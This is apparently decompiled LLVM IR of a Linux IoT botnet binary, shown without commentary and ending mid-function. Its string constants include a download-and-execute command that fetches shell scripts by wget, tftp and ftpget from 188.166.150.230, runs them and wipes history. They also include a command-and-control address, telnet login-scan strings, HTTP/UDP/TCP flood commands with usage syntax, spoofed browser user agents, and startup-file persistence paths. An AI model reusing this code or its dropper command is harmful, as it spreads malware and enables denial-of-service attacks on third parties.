source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8059134.2 = global i32 0
@global_var_8059164.3 = local_unnamed_addr global i32* @global_var_8059134.2
@global_var_8058124.4 = constant i32 0
@global_var_8059138.6 = local_unnamed_addr global i32 0
@global_var_8059b20.7 = global i32 0
@global_var_8059b24.8 = local_unnamed_addr global i32 0
@global_var_8059b28.9 = local_unnamed_addr global i32 0
@global_var_8059850.10 = local_unnamed_addr global i32 4095
@global_var_805984c.11 = local_unnamed_addr global i32 362436
@global_var_8055d7d.12 = constant [7 x i8] c"(null)\00"
@global_var_8055d84.14 = constant [3 x i8] c"-c\00"
@global_var_8055d87.15 = constant [3 x i8] c"sh\00"
@global_var_8055d8a.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8055da0.17 = constant i32 -1
@global_var_8059b00.18 = local_unnamed_addr global i32 0
@global_var_80561a0.19 = constant [5 x i8] c"PING\00"
@global_var_8055d71.20 = constant [8 x i8] c"busybox\00"
@global_var_8055d79.21 = constant i32 2293796
@global_var_8055d7b.22 = constant i32 1848115235
@global_var_8059800.23 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8055d71.20, i32 0, i32 0), i8* bitcast (i32* @global_var_8055d79.21 to i8*), i8* bitcast (i32* @global_var_8055d7b.22 to i8*)]
@global_var_8055d45.24 = constant [7 x i8] c"nvalid\00"
@global_var_8055d4c.25 = constant [6 x i8] c"ailed\00"
@global_var_8055d52.26 = constant [9 x i8] c"ncorrect\00"
@global_var_8055d5b.27 = constant [6 x i8] c"enied\00"
@global_var_8055d61.28 = constant [5 x i8] c"rror\00"
@global_var_8055d66.29 = constant [7 x i8] c"oodbye\00"
@global_var_8055d6d.30 = constant [4 x i8] c"bad\00"
@global_var_80597e0.31 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d45.24, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d4c.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055d52.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d5b.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8055d61.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d66.29, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055d6d.30, i32 0, i32 0)]
@global_var_8059b08.32 = local_unnamed_addr global i32 0
@global_var_8059b0c.33 = local_unnamed_addr global i32 0
@global_var_805fd94.34 = local_unnamed_addr global i32 0
@global_var_80561a5.35 = constant [6 x i8] c":>%$#\00"
@global_var_80561ac.40 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_805fd88.41 = local_unnamed_addr global i32 0
@global_var_8055ce0.42 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_8055cef.43 = constant [6 x i8] c"/tmp/\00"
@global_var_8055cf5.44 = constant [6 x i8] c"/var/\00"
@global_var_8055cfb.45 = constant [6 x i8] c"/dev/\00"
@global_var_8055d01.46 = constant [10 x i8] c"/var/run/\00"
@global_var_8055d0b.47 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8055d15.48 = constant [6 x i8] c"/mnt/\00"
@global_var_8055d1b.49 = constant [7 x i8] c"/boot/\00"
@global_var_8055d22.50 = constant [6 x i8] c"/usr/\00"
@global_var_8055d28.51 = constant [6 x i8] c"/opt/\00"
@global_var_80597a0.52 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8055ce0.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055cef.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055cf5.44, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055cfb.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055d01.46, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055d0b.47, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d15.48, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d1b.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d22.50, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d28.51, i32 0, i32 0)]
@global_var_80597cc = external global i32
@global_var_80561b8.57 = constant [3 x i8] c"\0D\0A\00"
@global_var_8059820.58 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d45.24, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d4c.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055d52.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d5b.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8055d61.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d66.29, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055d6d.30, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8055d71.20, i32 0, i32 0), i8* bitcast (i32* @global_var_8055d79.21 to i8*), i8* bitcast (i32* @global_var_8055d7b.22 to i8*)]
@global_var_80561bc.59 = constant i32 993090331
@global_var_8056219.60 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_805621e.61 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_8055190.62 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_8059214.63 = local_unnamed_addr global [443 x i8]* @global_var_8055190.62
@global_var_8056248.64 = constant [6 x i8] c"arfgG\00"
@global_var_805624e.65 = constant [9 x i8] c"HBiug655\00"
@global_var_8056257.66 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_8056264.67 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_8056278.68 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_8056289.69 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8056295.70 = constant [12 x i8] c"RYSDk747586\00"
@global_var_80562a1.71 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_80562ad.72 = constant [10 x i8] c"KHGK7985i\00"
@global_var_80562b7.73 = constant [11 x i8] c"yuituiILYF\00"
@global_var_80562c2.74 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_80562d0.75 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_80562dc.76 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_80562e9.77 = constant [9 x i8] c"ewqdcftr\00"
@global_var_80562f2.78 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_8056302.79 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_805630d.80 = constant [12 x i8] c"twehgbferhb\00"
@global_var_8056319.81 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_8056325.82 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_8056333.83 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_8056341.84 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_805634f.85 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_8056359.86 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_8056367.87 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_8056375.88 = constant [12 x i8] c"yteytietyue\00"
@global_var_8056381.89 = constant [9 x i8] c"qsortEQS\00"
@global_var_805638a.90 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805639a.91 = constant [4 x i8] c"std\00"
@global_var_805639e.92 = constant [4 x i8] c"dts\00"
@global_var_80563a2.93 = constant [4 x i8] c"lsk\00"
@global_var_80563a6.94 = constant [4 x i8] c"kek\00"
@global_var_80563aa.95 = constant [6 x i8] c"smack\00"
@global_var_80563b0.96 = constant [4 x i8] c"ily\00"
@global_var_80563b4.97 = constant [4 x i8] c"tyf\00"
@global_var_80563b8.98 = constant [4 x i8] c"pos\00"
@global_var_80563bc.99 = constant [6 x i8] c"cunts\00"
@global_var_80563e0.100 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056248.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805624e.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8056257.66, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8056264.67, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8056278.68, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056289.69, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056295.70, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80562a1.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80562ad.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80562b7.73, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80562c2.74, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80562d0.75, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80562dc.76, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80562e9.77, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80562f2.78, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056302.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805630d.80, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056319.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056325.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056333.83, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056341.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805634f.85, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056359.86, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8056367.87, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8056375.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056381.89, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805638a.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805639a.91, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805639e.92, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80563a2.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80563a6.94, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80563aa.95, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80563b0.96, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80563b4.97, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80563b8.98, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80563bc.99, i32 0, i32 0)]
@global_var_80544a0.101 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_80544e0.102 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_8054524.103 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_8054568.104 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_80545ac.105 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_80545f0.106 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_8054634.107 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_8054678.108 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_80546e8.109 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_805475c.110 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_80547a8.111 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_8054830.112 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_805487c.113 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_80548ec.114 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_805495c.115 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_80549d0.116 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_8054a48.117 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_8054a90.118 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_8054ac0.119 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_8054b00.120 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_8054b4c.121 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_8054bc4.122 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_8054c34.123 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_8054ca4.124 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_8054d18.125 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_8054dac.126 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_8054df4.127 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_8054e3c.128 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_8054e7c.129 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_8054ef8.130 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_8054f60.131 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_8054fdc.132 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_805502c.133 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_8055080.134 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_80550d4.135 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_8055128.136 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_805517b.137 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_8056470.139 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_80564b0.140 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_80564cc.141 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_80564ed.142 = constant [4 x i8] c"all\00"
@global_var_80564f1.143 = constant i32 2037579820
@global_var_80564f3.144 = constant [4 x i8] c"syn\00"
@global_var_80564f7.145 = constant [4 x i8] c"rst\00"
@global_var_80564fb.146 = constant [4 x i8] c"fin\00"
@global_var_80564ff.147 = constant [4 x i8] c"ack\00"
@global_var_8056503.148 = constant [4 x i8] c"psh\00"
@global_var_8056507.149 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_8056519.150 = constant [6 x i8] c"PONG!\00"
@global_var_805651f.151 = constant [6 x i8] c"PUSSY\00"
@global_var_8056525.152 = constant [4 x i8] c"OFF\00"
@global_var_805fd90.153 = local_unnamed_addr global i32 0
@global_var_8056529.154 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_8056537.155 = constant [3 x i8] c"ON\00"
@global_var_805653a.156 = constant [5 x i8] c"HTTP\00"
@global_var_8056540.157 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_8056566.158 = constant [4 x i8] c"UDP\00"
@global_var_805656c.159 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_80565dd.160 = constant [4 x i8] c"TCP\00"
@global_var_80565e4.161 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_805669e.162 = constant [4 x i8] c"STD\00"
@global_var_80566a2.163 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_80566bd.164 = constant [5 x i8] c"STOP\00"
@global_var_8059798.165 = local_unnamed_addr global i32 -1
@global_var_8059210.166 = global [20 x i8]* @global_var_805517b.137
@global_var_80566c2.167 = constant [8 x i8] c"8.8.8.8\00"
@global_var_80566ca.168 = constant [16 x i8] c"/proc/net/route\00"
@global_var_80566da.169 = constant [11 x i8] c"\0900000000\09\00"
@global_var_80566e5.171 = constant [7 x i8] c"x86_32\00"
@global_var_80566ec.172 = constant i32 1952788224
@global_var_80566ed.173 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_8056700.174 = constant i32 1697579122
@global_var_8056702.175 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_8056711.177 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_8056719.178 = constant i32 1868955745
@global_var_805671b.179 = constant [13 x i8] c"fork failed\0A\00"
@global_var_8056728.180 = constant i32 993090331
@global_var_805678f.181 = constant [5 x i8] c"PONG\00"
@global_var_8056794.182 = constant [9 x i8] c"LELIMDUP\00"
@global_var_805679d.183 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_80567b1.184 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_80567bc.185 = constant [8 x i8] c"%s 2>&1\00"
@global_var_80567c4.186 = constant [3 x i8] c"%s\00"
@global_var_80567c7.187 = constant i32 32
@global_var_805fd50.188 = local_unnamed_addr global i32 0
@global_var_8059858 = external local_unnamed_addr global i32
@global_var_80598c0.191 = global i32 288
@global_var_8059910.192 = local_unnamed_addr global i32 272
@global_var_805fd60.194 = global i32 0
@global_var_8059894.195 = global i32 0
@global_var_805db24.196 = local_unnamed_addr global i32 0
@global_var_805db28.197 = local_unnamed_addr global i32 0
@global_var_80598ac.198 = local_unnamed_addr global i32 2
@global_var_805987c.199 = global i32 0
@global_var_8059878.200 = global i32* @global_var_80598c0.191
@global_var_8056de0.201 = constant i32 0
@global_var_8056df8.202 = constant [6 x i8] c"(nil)\00"
@global_var_8056dfe.203 = constant [7 x i8] c"(null)\00"
@global_var_8056e05.204 = constant i32 2949163
@global_var_8056e72.206 = constant i32 327688
@global_var_8056e6a.207 = constant [8 x i8] c" +0-#'I\00"
@global_var_8056e18.208 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8056e55.209 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_8056e4b.210 = constant i32 117506048
@global_var_8056e3c.211 = constant i32 331776
@global_var_8056ec0.212 = constant [8 x i8] c"Success\00"
@global_var_8056e96.213 = constant [15 x i8] c"Unknown error \00"
@global_var_8057dc0.214 = constant i32 65536
@global_var_8059ac0.215 = local_unnamed_addr global i32* @global_var_8057dc0.214
@global_var_805fb40.216 = global i32 0
@global_var_805fb44.217 = global i32 0
@global_var_805fb60.218 = global i32 0
@global_var_805fd2c.219 = global i32 0
@global_var_8059ac8.220 = global i32 0
@global_var_80601b4.221 = local_unnamed_addr global i32 0
@global_var_80601a8.222 = global i32 0
@global_var_805fda0.223 = global i32 0
@global_var_80599b0.224 = global i32 0
@global_var_805fe4c.226 = global i32 0
@global_var_805fe50.227 = local_unnamed_addr global i32 0
@global_var_805fe54.228 = global i32 0
@global_var_805fe60.229 = local_unnamed_addr global i32 0
@global_var_8060154.230 = global i32 0
@global_var_806017c.231 = local_unnamed_addr global i32 0
@global_var_806016c.232 = local_unnamed_addr global i32 0
@global_var_8060170.233 = local_unnamed_addr global i32 0
@global_var_8060174.234 = local_unnamed_addr global i32 0
@global_var_8060178.235 = local_unnamed_addr global i32 0
@global_var_8060184.236 = local_unnamed_addr global i32 0
@global_var_8060190.237 = local_unnamed_addr global i32 0
@global_var_8060188.238 = local_unnamed_addr global i32 0
@global_var_8060194.239 = local_unnamed_addr global i32 0
@global_var_8060168.240 = local_unnamed_addr global i32 0
@global_var_8060164.242 = local_unnamed_addr global i32 0
@global_var_806018c.243 = local_unnamed_addr global i32 0
@global_var_805fe5c.244 = local_unnamed_addr global i32 0
@global_var_80599c8.245 = global i32 0
@global_var_80599e0.247 = global i32 0
@global_var_80599f8 = external global i32
@global_var_8059a24.249 = global i32 -1726662223
@global_var_8059a00.250 = local_unnamed_addr global i32* @global_var_8059a24.249
@global_var_80599fc.251 = global i32* @global_var_8059a24.249
@global_var_8057a34.252 = constant i32 0
@global_var_8057a20.253 = constant i32 0
@global_var_8059aa0.254 = global i32 0
@global_var_805fd44.255 = local_unnamed_addr global i32 0
@global_var_805fd4c.256 = local_unnamed_addr global i32 0
@global_var_8059128.258 = global i32 -1
@global_var_805159b.259 = constant i32 -294069
@global_var_805fd54.260 = local_unnamed_addr global i32 0
@global_var_805fd58.261 = local_unnamed_addr global i32 0
@global_var_8057ca0.262 = constant [10 x i8] c"/dev/null\00"
@global_var_805fd48.264 = local_unnamed_addr global i32 0
@global_var_8051781.266 = constant i32 1928542531
@global_var_80517a5.267 = constant i32 1928542531
@global_var_805fd84.268 = local_unnamed_addr global i32 0
@global_var_805fd64.269 = global i32 0
@global_var_8057fd0.271 = constant [4 x i8] c"inf\00"
@global_var_8057fd3.276 = constant i32 1179535616
@global_var_8057fe0.277 = constant i32 2883630
@global_var_80601b8.281 = local_unnamed_addr global i32 0
@global_var_805809c.282 = constant i32 1697579054
@global_var_80580d0.283 = constant i32 1868824690
@global_var_805809e.284 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_80580af.285 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_80580c7.286 = constant [11 x i8] c"nameserver\00"
@global_var_80580d2.287 = constant [7 x i8] c"domain\00"
@global_var_80580d9.288 = constant [7 x i8] c"search\00"
@global_var_8060198.289 = global i32 0
@global_var_80601bc.290 = local_unnamed_addr global i32 0
@global_var_80601c0.291 = local_unnamed_addr global i32 0
@global_var_80580f4.292 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_80580f1.294 = constant [3 x i8] c"%x\00"
@global_var_8058105.295 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8058110.296 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8059ae0.1 = local_unnamed_addr global i8 0
@global_var_805db20.13 = external local_unnamed_addr global i8*
@global_var_8059b1b.36 = local_unnamed_addr global i8 0
@global_var_8059b1c.37 = local_unnamed_addr global i8 0
@global_var_8059b1d.38 = local_unnamed_addr global i8 0
@global_var_8059b1e.39 = local_unnamed_addr global i8 0
@global_var_8059b10.170 = external global i8*
@1 = internal constant [2 x i8] c"/\00"
@global_var_805670f.176 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_8056e8a.205 = external constant i8*
@global_var_805fe20.225 = global i8 0
@global_var_8060180.241 = local_unnamed_addr global i8 0
@global_var_805fd40.246 = local_unnamed_addr global i8 0
@global_var_805fd5c.263 = local_unnamed_addr global i8 0
@global_var_805fd68.278 = external global i8*
@global_var_805fd80.279 = local_unnamed_addr global i64 0
@global_var_8059ac4.280 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 69791
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8059ae0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
